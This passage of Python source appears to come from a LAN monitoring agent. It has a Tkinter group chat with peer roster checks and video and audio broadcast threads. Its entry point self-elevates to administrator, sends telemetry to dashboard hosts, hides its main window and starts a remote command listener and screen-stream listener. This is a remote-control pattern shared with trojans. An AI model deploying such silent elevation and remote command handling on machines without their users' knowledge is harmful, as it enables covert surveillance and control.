    active_video_call["cap_instance"] = cap
    
    threading.Thread(target=broadcast_video_stream, daemon=True).start()
    threading.Thread(target=broadcast_audio_stream, daemon=True).start()  
    
    spawn_video_ui_window()

def get_or_assign_peer_color(peer_id):
    if peer_id in peer_colors: return peer_colors[peer_id]
    vibrant_pool = ["#FF5555", "#50FA7B", "#F1FA8C", "#BD93F9", "#FF79C6", "#8BE9FD", "#FFB86C", "#00FFFF", "#FF00FF", "#38BDF8"]
    assigned_color = random.choice(vibrant_pool)
    peer_colors[peer_id] = assigned_color
    return assigned_color

def refresh_roster_display():
    lb = active_chat_room["roster_listbox_instance"]
    if not lb or not active_chat_room["ui_instance"]: return
    try:
        lb.delete(0, tk.END)
        my_local_ip = get_local_ip()
        my_color = get_or_assign_peer_color(my_local_ip)
        lb.insert(tk.END, f"● {my_local_ip} (You)")
        lb.itemconfig(0, fg=my_color)
        
        idx = 1
        for peer in active_chat_room["peers"]:
            if peer not in ["127.0.0.1", "localhost", my_local_ip]:
                lb.insert(tk.END, f"○ {peer}")
                peer_color = get_or_assign_peer_color(peer)
                lb.itemconfig(idx, fg=peer_color)
                idx += 1
    except: pass

def dynamic_roster_monitor_loop():
    while True:
        if active_chat_room["ui_instance"] and active_chat_room["peers"]:
            verified_peers = []
            my_local_ip = get_local_ip()
            snapshot_peers = list(active_chat_room["peers"])
            for peer_ip in snapshot_peers:
                if peer_ip in ["127.0.0.1", "localhost", my_local_ip]: continue
                is_alive = False
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(1.5)
                        s.connect((peer_ip, CHAT_STREAM_PORT))
                        s.sendall(json.dumps({"type": "ping"}).encode('utf-8'))
                        response_bytes = s.recv(1024).decode('utf-8')
                        if response_bytes:
                            resp_data = json.loads(response_bytes)
                            if resp_data.get("status") == "active": is_alive = True
                except: pass
                
                if is_alive: verified_peers.append(peer_ip)
            
            ui_window = active_chat_room["ui_instance"]
            if ui_window is not None:
                try: ui_window.after(0, lambda fresh=verified_peers: safe_roster_sync(fresh))
                except: pass
        time.sleep(3)

def safe_roster_sync(fresh_list):
    if active_chat_room["ui_instance"] is not None:
        active_chat_room["peers"] = fresh_list
        refresh_roster_display()

def spawn_secure_chat_ui():
    if active_chat_room["ui_instance"] is not None: return

    root_chat = tk.Toplevel(global_root_engine)
    root_chat.title("SECURE LAN CHAT ROUTE")
    root_chat.geometry("650x550")
    root_chat.minsize(550, 450)
    root_chat.configure(bg="#1A1B26")  
    root_chat.attributes("-topmost", True)
    
    active_chat_room["ui_instance"] = root_chat

    def on_close_cleanup():
        session_timer["is_running"] = False # Stop clock matrix recalculation tasks on manual kill events
        def alert_dashboard_exit():
            exit_packet = json.dumps({"action": "agent_exit_chat"})
            payload_bytes = exit_packet.encode('utf-8')
            payload_len = len(payload_bytes)
            for host_ip in DASHBOARD_IPS:
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(2.0)
                        s.connect((host_ip, TELEMETRY_PORT))
                        s.sendall(payload_len.to_bytes(4, byteorder='big'))
                        s.sendall(payload_bytes)
                except: pass

        threading.Thread(target=alert_dashboard_exit, daemon=True).start()
        
        active_chat_room["ui_instance"] = None
        active_chat_room["text_area"] = None
        active_chat_room["roster_listbox_instance"] = None
        active_chat_room["peers"] = []
        try: root_chat.destroy()
        except: pass

    root_chat.protocol("WM_DELETE_WINDOW", on_close_cleanup)

    # Label initialization tracking configuration for chat interface window frame context
    lbl_title = tk.Label(root_chat, text="// ACTIVE PEER LINK MATRIX  |  [TIME REMAINING: 30:00]", font=("Consolas", 11, "bold"), fg="#10B981", bg="#1A1B26", anchor="w")
    lbl_title.pack(fill=tk.X, padx=15, pady=(15, 5))
    session_timer["chat_label_instance"] = lbl_title

    workspace_frame = tk.Frame(root_chat, bg="#1A1B26")
    workspace_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=5)
    roster_frame = tk.Frame(workspace_frame, bg="#1A1B26")
    roster_frame.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 10))

    tk.Label(roster_frame, text="PARTICIPANTS", font=("Segoe UI", 9, "bold"), fg="#A9B1D6", bg="#1A1B26", anchor="w").pack(fill=tk.X, pady=(0, 5))
    lst_participants = tk.Listbox(roster_frame, width=22, font=("Segoe UI", 10), bg="#11121A", fg="#9ECE6A", bd=0, highlightthickness=1, highlightbackground="#2A2B36", selectbackground="#1A1B26")
    lst_participants.pack(fill=tk.Y, expand=True)

    active_chat_room["roster_listbox_instance"] = lst_participants
    refresh_roster_display()
    
    if not hasattr(spawn_secure_chat_ui, "monitor_started"):
        threading.Thread(target=dynamic_roster_monitor_loop, daemon=True).start()
        spawn_secure_chat_ui.monitor_started = True

    stream_frame = tk.Frame(workspace_frame, bg="#1A1B26")
    stream_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)

    txt_display = scrolledtext.ScrolledText(stream_frame, wrap=tk.WORD, state="disabled", font=("Segoe UI", 10), bg="#11121A", fg="#E0E0E6", bd=0, highlightthickness=1, highlightbackground="#2A2B36", highlightcolor="#10B981")
    txt_display.pack(fill=tk.BOTH, expand=True)
    active_chat_room["text_area"] = txt_display

    txt_display.tag_configure("self_msg", justify="right", foreground="#10B981")
    txt_display.tag_configure("peer_msg", justify="left", foreground="#E0E0E6")

    input_frame = tk.Frame(root_chat, bg="#1A1B26")
    input_frame.pack(fill=tk.X, side=tk.BOTTOM, padx=15, pady=15)

    ent_message = tk.Entry(input_frame, font=("Segoe UI", 11), bg="#11121A", fg="#FFFFFF", insertbackground="#FFFFFF", bd=0, highlightthickness=1, highlightbackground="#2A2B36", highlightcolor="#10B981")
    ent_message.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=8)

    def transmit_group_message():
        raw_txt = ent_message.get().strip()
        if not raw_txt: return
        
        my_local_ip = get_local_ip()
        msg_packet = json.dumps({"type": "message", "sender_ip": my_local_ip, "message": raw_txt})
        my_color = get_or_assign_peer_color(my_local_ip)
        custom_self_tag = f"tag_{my_local_ip.replace('.', '_')}"
        
        txt_display.tag_configure(custom_self_tag, justify="right", foreground=my_color)
        txt_display.config(state="normal")
        txt_display.insert(tk.END, f"[{my_local_ip}]: ", custom_self_tag)
        txt_display.insert(tk.END, f"{raw_txt}\n", "self_msg")
        txt_display.config(state="disabled")
        txt_display.see(tk.END)
        ent_message.delete(0, tk.END)

        def worker():
            local_ip = get_local_ip()
            for peer_ip in list(active_chat_room["peers"]):
                if peer_ip in ["127.0.0.1", "localhost", local_ip]: continue
                try:
                    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                        s.settimeout(2.0)
                        s.connect((peer_ip, CHAT_STREAM_PORT))
                        s.sendall(msg_packet.encode('utf-8'))
                except: pass

        threading.Thread(target=worker, daemon=True).start()

    btn_send = tk.Button(input_frame, text="SEND MESSAGE", font=("Segoe UI", 9, "bold"), fg="#FFFFFF", bg="#10B981", activebackground="#059669", bd=0, width=15, cursor="hand2", command=transmit_group_message)
    btn_send.pack(side=tk.RIGHT, padx=(10, 0), ipady=7)
    ent_message.bind("<Return>", lambda e: transmit_group_message())

    root_chat.update_idletasks()
    root_chat.lift()
    root_chat.focus_force()
    update_all_timer_displays() # Sync display clock on visualization load pass

def run_application_event_poll():
    try:
        while True:
            task = ui_queue.get_nowait()
            if task == "LAUNCH_CHAT": spawn_secure_chat_ui()
    except queue.Empty: pass
    
    if global_root_engine:
        global_root_engine.after(200, run_application_event_poll)

if __name__ == "__main__":
    if not is_admin():
        try: ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        except: pass
        sys.exit()
    
    package_and_transmit_telemetry()
    threading.Thread(target=command_listener_interface, daemon=True).start()
    threading.Thread(target=screen_stream_listener_interface, daemon=True).start()
    threading.Thread(target=peer_chat_receiver_interface, daemon=True).start()
    threading.Thread(target=video_receiver_interface, daemon=True).start()
    threading.Thread(target=audio_receiver_interface, daemon=True).start()  
    
    global_root_engine = tk.Tk()
    global_root_engine.withdraw()  
    
    global_root_engine.after(200, run_application_event_poll)
    global_root_engine.mainloop()
